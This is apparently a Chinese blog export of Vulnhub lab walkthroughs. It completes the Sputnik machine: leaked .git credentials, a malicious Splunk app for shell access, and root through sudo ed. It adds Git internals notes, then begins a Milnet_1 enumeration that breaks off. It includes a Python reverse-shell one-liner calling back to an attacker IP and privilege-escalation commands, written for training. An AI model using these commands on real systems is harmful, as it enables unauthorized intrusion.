drwxr-xr-x 5 kali kali 4.0K Jul 18 11:04 ..<br>1183471 drwxr-xr-x 8 kali kali 4.0K Jul 18 11:04 .git<br>1183785 -rw-r--r-- 1 kali kali  378 Jul 18 11:04 .gitattributes<br>1183800 -rw-r--r-- 1 kali kali  649 Jul 18 11:04 .gitignore<br>1183802 -rw-r--r-- 1 kali kali 7.5K Jul 18 11:04 index.html<br>1183801 -rw-r--r-- 1 kali kali   26 Jul 18 11:04 README.md<br>1183806 -rw-r--r-- 1 kali kali   42 Jul 18 11:04 secret<br>1183803 -rw-r--r-- 1 kali kali  12K Jul 18 11:04 sheet.png<br>1183804 -rw-r--r-- 1 kali kali 2.1K Jul 18 11:04 sprite.js<br><br><br>┌──(kali㉿kali)-[~/Downloads/Sputnik/flappy]<br>└─$ <span class="hljs-built_in">cat</span> secret <br>sputnik:ameer_says_thank_you_and_good_job<br></code></pre></td></tr></table></figure><p>拿到了用户名和密码，尝试登录 61337 端口。</p><h2 id="Splunk-后台-getshell"><a href="#Splunk-后台-getshell" class="headerlink" title="Splunk 后台 getshell"></a>Splunk 后台 getshell</h2><p>后台如何 Getshell 还是得靠搜索。</p><p><img src="/pic/e624777bfae5e70157ea0c88fac18312_MD5.png"></p><p>点击第一个博客，里面提到了一个 GitHub 开源工具 <a href="https://github.com/TBGSecurity/splunk_shells">https://github.com/TBGSecurity/splunk_shells</a> ，将其下载到本地再上传到后台</p><p>点击 Manage Apps</p><p><img src="/pic/d1dd7a7c0fb61226a338cd672f1efd33_MD5.png"></p><p>上传恶意App</p><p><img src="/pic/079bef2b61772eee2e94a8b3fe2759c2_MD5.png"></p><p>然后会提示重启 Splunk，重新登录后，继续点击 Manage Apps，找到上传的 App <code>Weaponize Splunk for Pentesting and Red Teaming </code> 点击 permissions</p><p><img src="/pic/d6e2fac2cc8e28853e058a13acfe1d96_MD5.png"></p><p>给定以上权限，然后提前开启监听，之后在 search 界面，使用以下语句进行反弹 shell：<code>| revshell std IP Port</code></p><p><img src="/pic/db88e5516fc4dd9cd8e781ccc0219fe6_MD5.png"></p><p>另一边反弹 shell 成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nc -lvnp 443                  <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [192.168.56.106] from (UNKNOWN) [192.168.56.130] 56982<br><span class="hljs-built_in">whoami</span><br>splunk<br><span class="hljs-built_in">id</span><br>uid=1001(splunk) gid=1001(splunk) <span class="hljs-built_in">groups</span>=1001(splunk)<br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s17: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:d8:0b:51 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.130/24 brd 192.168.56.255 scope global dynamic enp0s17<br>       valid_lft 553sec preferred_lft 553sec<br>    inet6 fe80::a00:27ff:fed8:b51/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br><span class="hljs-built_in">uname</span> -a<br>Linux sputnik 4.15.0-46-generic <span class="hljs-comment">#49-Ubuntu SMP Wed Feb 6 09:33:07 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="hljs-built_in">which</span> python<br>/opt/splunk/bin/python<br>python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><br><span class="hljs-built_in">whoami</span><br>^C<br></code></pre></td></tr></table></figure><p>一开始反弹的 shell 有问题，交互性提升失败，不过既然有 python，我们可以再反弹一次 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.56.106&quot;,444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nc -lvnp 444                  <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 444 ...<br>connect to [192.168.56.106] from (UNKNOWN) [192.168.56.130] 52604<br>splunk@sputnik:/$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>splunk<br>splunk@sputnik:/$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=1001(splunk) gid=1001(splunk) <span class="hljs-built_in">groups</span>=1001(splunk)<br>splunk@sputnik:/$ <span class="hljs-built_in">uname</span> -a<br><span class="hljs-built_in">uname</span> -a<br>Linux sputnik 4.15.0-46-generic <span class="hljs-comment">#49-Ubuntu SMP Wed Feb 6 09:33:07 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span><br>splunk@sputnik:/$ ip a<br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s17: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:d8:0b:51 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.130/24 brd 192.168.56.255 scope global dynamic enp0s17<br>       valid_lft 600sec preferred_lft 600sec<br>    inet6 fe80::a00:27ff:fed8:b51/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>成功。接下来看看 <code>sudo -l</code> 的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">splunk@sputnik:/$ sudo -l<br>sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> splunk: ameer_says_thank_you_and_good_job<br><br>Matching Defaults entries <span class="hljs-keyword">for</span> splunk on sputnik:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User splunk may run the following commands on sputnik:<br>    (root) /bin/ed<br></code></pre></td></tr></table></figure><p>可以直接以 root 身份使用 ed 命令，那这提权比较简单了，gtfobins 查一查得到</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">sudo <span class="hljs-regexp">/bin/</span>ed<br>!<span class="hljs-regexp">/bin/</span>bash<br></code></pre></td></tr></table></figure><p>提权成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs bash">splunk@sputnik:/$ sudo /bin/ed<br>sudo /bin/ed<br>!/bin/bash<br>!/bin/bash<br>root@sputnik:/<span class="hljs-comment"># cd /root</span><br><span class="hljs-built_in">cd</span> /root<br>root@sputnik:~<span class="hljs-comment"># ls -alih</span><br><span class="hljs-built_in">ls</span> -alih<br>total 28K<br>131074 drwx------  4 root root 4.0K Mar 29  2019 .<br>     2 drwxr-xr-x 23 root root 4.0K Mar 29  2019 ..<br>131075 -rw-r--r--  1 root root 3.1K Apr  9  2018 .bashrc<br>131077 -r--------  1 root root 1.7K Mar 29  2019 flag.txt<br>273731 drwxr-xr-x  3 root root 4.0K Mar 29  2019 .<span class="hljs-built_in">local</span><br>131076 -rw-r--r--  1 root root  148 Aug 17  2015 .profile<br>269461 drwx------  2 root root 4.0K Mar 29  2019 .ssh<br>root@sputnik:~<span class="hljs-comment"># cat flag.txt</span><br><span class="hljs-built_in">cat</span> flag.txt<br> _________________________________________<br>/ Congratulations!                        \<br>|                                         |<br>| You did it!                             |<br>|                                         |<br>| Thank you <span class="hljs-keyword">for</span> trying out this challenge |<br>| and hope that you learn a thing or two. |<br>|                                         |<br>| Check the flag below.                   |<br>|                                         |<br>| flag_is&#123;w1th_gr34t_p0w3r_c0m35_w1th_gr3 |<br>| 4t_r3sp0ns1b1l1ty&#125;                      |<br>|                                         |<br>| Hope you enjoy solving this challenge.  |<br>| :D                                      |<br>|                                         |<br>\ - ameer (from hackstreetboys)           /<br> -----------------------------------------<br>      \                    / \  //\<br>       \    |\___/|      /   \//  \\<br>            /0  0  \__  /    //  | \ \    <br>           /     /  \/_/    //   |  \  \  <br>           @_^_@<span class="hljs-string">&#x27;/   \/_   //    |   \   \ </span><br><span class="hljs-string">           //_^_/     \/_ //     |    \    \</span><br><span class="hljs-string">        ( //) |        \///      |     \     \</span><br><span class="hljs-string">      ( / /) _|_ /   )  //       |      \     _\</span><br><span class="hljs-string">    ( // /) &#x27;</span>/,_ _ _/  ( ; -.    |    _ _\.-~        .-~~~^-.<br>  (( / / )) ,-&#123;        _      `-.|.-~-.           .~         `.<br> (( // / ))  <span class="hljs-string">&#x27;/\      /                 ~-. _ .-~      .-~^-.  \</span><br><span class="hljs-string"> (( /// ))      `.   &#123;            &#125;                   /      \  \</span><br><span class="hljs-string">  (( / ))     .----~-.\        \-&#x27;</span>                 .~         \  `. \^-.<br>             ///.----..&gt;        \             _ -~             `.  ^-`  ^-_<br>               ///-._ _ _ _ _ _ _&#125;^ - - - - ~                     ~-- ,.-~<br>                                                                  /.-~<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>比较简单的一台机器，主要考察的是 .git 泄露和信息收集的能力，提权是比较常规的手法。不过也发现了自己对于 git 不够熟悉，只是朦朦胧胧有个大概的概念</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="Git-知识点补充"><a href="#Git-知识点补充" class="headerlink" title="Git 知识点补充"></a>Git 知识点补充</h3><p>参考自<a href="https://www.ruanyifeng.com/blog/2018/10/git-internals.html">Git 原理入门 - 阮一峰的网络日志 (ruanyifeng.com)</a></p><ul><li>初始化：<code>git init</code>，在项目根目录下创建一个 <code>.git</code> 子目录，用来保存版本信息。<ul><li>git config –list # 显示当前的Git配置</li></ul></li><li>将文件加入 Git 仓库：<code>git hash-object -w filename</code> 。<ul><li>压缩成二进制文件，存入 Git，保存在 <code>.git/objects</code> 目录。</li><li>计算当前内容的 SHA1 哈希值（长度为 40 的字符串）</li><li>新生成的 Git 对象文件使用计算得到的哈希值作为文件名，哈希值的前两位是目录名，后 38 位是作为文件名</li><li>想看二进制文件原始的文本内容，要用 <code>git cat-file</code> 命令</li></ul></li><li>暂存区（index, stage）<ul><li><code>git update-index</code> 命令用于在暂存区记录一个发生变动的文件。</li><li><code>git update-index --add --cacheinfo 100644 &lt;sha1&gt; &lt;path&gt;</code> 用于向 Git 索引添加一个新的文件或更新现有文件的信息。<code>100644</code> 表示文件权限，这里指的是普通文件</li><li><code>git status</code> 命令会产生更可读的结果。</li></ul></li><li>上述两个步骤合二为一（保存对象和更新暂存区）：<code>git add</code><ul><li><code>git add --all</code> 对当前项目所有变动的文件，执行前面的两步操作。</li><li>更改 写入 <code>.git/index</code> 中</li></ul></li><li>commit: 相当于生成了当前项目的一个快照，Git 项目可以恢复到任意一个快照<ul><li>每次提交需要记录是谁提交的，因此建议配置用户名和 Email</li><li><code>git config user.name &quot;用户名&quot;</code> </li><li><code>git config user.email &quot;Email 地址&quot;</code></li></ul></li><li>生成目录结构对象并提交说明<ul><li><code>git write-tree</code> 命令用来将当前的目录结构，生成一个 Git 对象。</li><li><code>git commit-tree</code> 命令用于将目录树对象写入版本历史，同时需要加上说明（<code>echo &quot;first commit&quot; | git commit-tree 目录结构对象</code>），最终会生成一个对象</li><li><code>git log --stat 版本历史对象</code></li></ul></li><li><code>branch</code>:虽然我们前面已经提交了快照，但是还没有记录这个快照属于哪个分支。<ul><li>Git 有一个特殊指针 HEAD，总是指向当前分支的最近一次快照。<code>HEAD~6</code> 是 <code>HEAD</code> 之前的第6个快照。</li><li>每一个分支指针都是一个文本文件，保存在 <code>.git/refs/heads/</code> 目录</li></ul></li><li><code>git commit</code> 一步到位：<code>git commit -m &quot;first commit&quot;</code><ul><li>当前分支指针移向新创建的快照。</li><li><code>git checkout Git对象</code> 切换到某个快照</li><li><code>git show Git对象</code> 命令用于展示某个快照的所有代码变动。</li></ul></li><li>自动改写分支指针的命令<ul><li><code>git commit</code>：当前分支指针移向新创建的快照。</li><li><code>git pull</code>：当前分支与远程分支合并后，指针指向新创建的快照。</li><li><code>git reset [commit_sha]</code>：当前分支指针重置为指定快照。</li></ul></li></ul><p><a href="https://www.ruanyifeng.com/blog/2015/12/git-cheat-sheet.html">常用 Git 命令清单 - 阮一峰的网络日志 (ruanyifeng.com)</a></p><p><img src="/pic/5fe9d174b1639baaca28d897e5e1e295_MD5.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 使用一次新的commit，替代上一次提交</span><br><span class="hljs-comment"># 如果代码没有任何新变化，则用来改写上一次commit的提交信息</span><br>$ git commit --amend -m [message]<br><br><span class="hljs-comment"># 列出所有本地分支</span><br>$ git branch<br><br><span class="hljs-comment"># 切换到上一个分支</span><br>$ git checkout -<br><br><span class="hljs-comment"># 合并指定分支到当前分支</span><br>$ git merge [branch]<br><br><span class="hljs-comment"># 新建一个分支，并切换到该分支</span><br>$ git checkout -b [branch]<br><br><span class="hljs-comment"># 删除分支</span><br>$ git branch -d [branch-name]<br><br><span class="hljs-comment"># 显示两次提交之间的差异</span><br>$ git diff [first-branch]...[second-branch]<br><br><span class="hljs-comment"># 取回远程仓库的变化，并与本地分支合并</span><br>$ git pull [remote] [branch]<br><br><span class="hljs-comment"># 强行推送当前分支到远程仓库，即使有冲突</span><br>$ git push [remote] --force<br><br><span class="hljs-comment"># 推送所有分支到远程仓库</span><br>$ git push [remote] --all<br></code></pre></td></tr></table></figure><h3 id="Git-泄露利用原理"><a href="#Git-泄露利用原理" class="headerlink" title=".Git 泄露利用原理"></a>.Git 泄露利用原理</h3><h4 id="Git-目录文件结构"><a href="#Git-目录文件结构" class="headerlink" title="Git 目录文件结构"></a>Git 目录文件结构</h4><p>这里仅列出我们 git 还原时需要的重点目录和文件：</p><figure class="highlight plaintext"><figcaption><span>HEAD — 当前 branch 指针。一般指向 refs/heads/ 里的 branch</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ├──">├── index — 当前branch 项目文件的 map<br>├── logs — 日志目录<br>│ ├── HEAD — 日志记录<br>├── objects — 项目文件目录<br>│ ├── info — pack文件指针（通常在客户端）<br>│ └── pack — pack文件目录<br>└── refs — branch 和 tags 目录<br>├── heads — 存放各个 branches 的指针<br>├── stash — 存放 stash文件<br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Object</span>（对象） 在 git 中，存储的数据将会保存至 .git/objects 目录下，内容经过 zlib 压缩，并且文件名使用 SHA1 Hash 命名。<br><br>Blob（数据对象） 在 git 中，源文件内容在 git 中的表现形式。<br><br>Tree <span class="hljs-keyword">object</span>（树对象） 类似于一个目录 map，用于指向 blobs 和其他 tree objects<br><br><span class="hljs-keyword">Commit</span> <span class="hljs-keyword">object</span>（提交对象） 用于指向一个 tree <span class="hljs-keyword">object</span>，并且包含 <span class="hljs-keyword">commit</span> author 和 parent commits<br><br>Tag <span class="hljs-keyword">object</span>（标签对象） 用于指向一个 <span class="hljs-keyword">commit</span> <span class="hljs-keyword">object</span>，并且包含一些数据<br><br>Reference 用于指向单个 <span class="hljs-keyword">object</span>。通常是一个 <span class="hljs-keyword">commit</span> 或是一个 tag。存放在 .git/refs/ 目录下<br></code></pre></td></tr></table></figure><p>一个最简单的 commit 的流程：</p><ul><li>当使用 git add . 时，在 objects 下新增一个 blob object; index 文件内容新增一个 blob object 的位置</li><li>当使用 git commit 时，在 objects 下新增 tree object 和 commit object，其中指向关系为：<code>refs/heads/master -&gt; commit object -&gt; tree object -&gt; blob object</code></li><li>更新 index 文件</li><li>记录 log 日志。日志内容包含 commit object</li></ul><p><a href="https://www.anquanke.com/post/id/236487#h2-1">从git原理角度浅谈.git泄露利用原理-安全客 - 安全资讯平台 (anquanke.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Milnet_1 靶机</title>
    <link href="/2023/07/b6c4e7bd4006.html"/>
    <url>/2023/07/b6c4e7bd4006.html</url>
    
    <content type="html"><![CDATA[<h1 id="Milnet-1-靶机"><a href="#Milnet-1-靶机" class="headerlink" title="Milnet_1 靶机"></a>Milnet_1 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.1.1.136    <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-18 02:56 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.136<br>Host is up (0.0017s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 00:0C:29:73:48:B8 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 11.73 seconds<br></code></pre></td></tr></table></figure><p>开放了 22,80 端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80 192.1.1.136   <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-18 02:57 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.136<br>Host is up (0.00044s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 9b:b5:21:38:96:7f:85:bd:1b:aa:9a:70:cf:db:<span class="hljs-built_in">cd</span>:36 (RSA)<br>|   256 93:30:be:c2:af:<span class="hljs-built_in">dd</span>:81:a8:25:2b:57:e5:01:49:91:57 (ECDSA)<br>|_  256 37:40:2b:cc:27:ae:89:22:d0:d2:65:65:c4:9b:53:42 (ED25519)<br>80/tcp open  http    lighttpd 1.4.35<br>|_http-title: Site doesn\<span class="hljs-string">&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="hljs-string">|_http-server-header: lighttpd/1.4.35</span><br><span class="hljs-string">MAC Address: 00:0C:29:73:48:B8 (VMware)</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 3.X|4.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="hljs-string">OS details: Linux 3.2 - 4.9</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 14.60 seconds</span><br></code></pre></td></tr></table></figure><p>Ubuntu 操作系统，lighttpd 1.4.35 搭建</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p22,80 192.1.1.136    <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-18 02:58 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.1.1.136<br>Host is up (0.00033s latency).<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>|_http-dombased-xss: Couldn\<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">|_http-stored-xss: Couldn\&#x27;</span>t find any stored XSS vulnerabilities.<br>| http-csrf: <br>| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.1.1.136<br>|   Found the following possible CSRF vulnerabilities: <br>|     <br>|     Path: http://192.1.1.136:80/nav.php<br>|     Form <span class="hljs-built_in">id</span>: <br>|     Form action: content.php<br>|     <br>|     Path: http://192.1.1.136:80/nav.php<br>|     Form <span class="hljs-built_in">id</span>: <br>|     Form action: content.php<br>|     <br>|     Path: http://192.1.1.136:80/nav.php<br>|     Form <span class="hljs-built_in">id</span>: <br>|_    Form action: content.php<br>|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)<br>| http-enum: <br>|_  /info.php: Possible information file<br>MAC Address: 00:0C:29:73:48:B8 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 87.41 seconds<br></code></pre></td></tr></table></figure><p>枚举得到了 <code>info.php</code>，尝试目录爆破吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo feroxbuster -u http://192.1.1.136 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,rar,zip,gz,sql,jpg<br><br> ___  ___  __   __     __      __         __   ___<br>|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__<br>|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___<br>by Ben <span class="hljs-string">&quot;epi&quot;</span> Risher 🤓                 ver: 2.10.0<br>───────────────────────────┬──────────────────────<br> 🎯  Target Url            │ http://192.1.1.136<br> 🚀  Threads               │ 50<br> 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br> 👌  Status Codes          │ All Status Codes!<br> 💥  Timeout (secs)        │ 7<br> 🦡  User-Agent            │ feroxbuster/2.10.0<br> 💉  Config File           │ /etc/feroxbuster/ferox-config.toml<br> 🔎  Extract Links         │ <span class="hljs-literal">true</span><br> 💲  Extensions            │ [php, rar, zip, gz, sql, jpg]<br> 🏁  HTTP methods          │ [GET]<br> 🔃  Recursion Depth       │ 4<br>───────────────────────────┴──────────────────────<br> 🏁  Press [ENTER] to use the Scan Management Menu™<br>──────────────────────────────────────────────────<br>404      GET       11l       28w      345c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter<br>200      GET        8l       14w      145c http://192.1.1.136/index.php<br>200      GET        4l       11w      109c http://192.1.1.136/main.php<br>200      GET       14l       38w      532c http://192.1.1.136/nav.php<br>200    